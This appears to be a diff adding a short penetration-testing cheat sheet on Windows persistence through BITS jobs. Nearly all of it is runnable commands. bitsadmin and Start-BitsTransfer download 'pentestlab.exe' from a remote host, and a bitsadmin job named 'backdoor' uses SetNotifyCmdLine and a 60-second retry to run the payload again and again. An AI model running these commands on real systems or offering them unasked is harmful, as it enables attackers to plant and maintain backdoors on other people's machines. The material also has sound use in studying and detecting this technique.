@@ -1,0 +1,22 @@
+Persistence
+
+bitsadmin /transfer backdoor /download /priority high http://10.0.2.21/pentestlab.exe C:\tmp\pentestlab.exe
+
+######  PowerShell cmdlet which can perform the same task  ###############
+
+Start-BitsTransfer -Source "http://10.0.2.21/pentestlab.exe" -Destination "C:\tmp\pentestlab.exe"
+
+Once the file has been dropped into disk the persistence
+can be achieved by executing the following commands from the “bitsadmin” utility
+
+1. The create parameter requires a name for the job
+2. The addfile requires the remote location of the file and the local path
+3. The SetNotifyCmdLine the command that will executed
+4. The SetMinRetryDelay defines the time for the callback (in seconds)
+5. The resume parameter will run the bits job. 
+
+bitsadmin /create backdoor
+bitsadmin /addfile backdoor "http://10.0.2.21/pentestlab.exe"  "C:\tmp\pentestlab.exe"
+bitsadmin /SetNotifyCmdLine backdoor C:\tmp\pentestlab.exe NUL
+bitsadmin /SetMinRetryDelay "backdoor" 60
+bitsadmin /resume backdoor
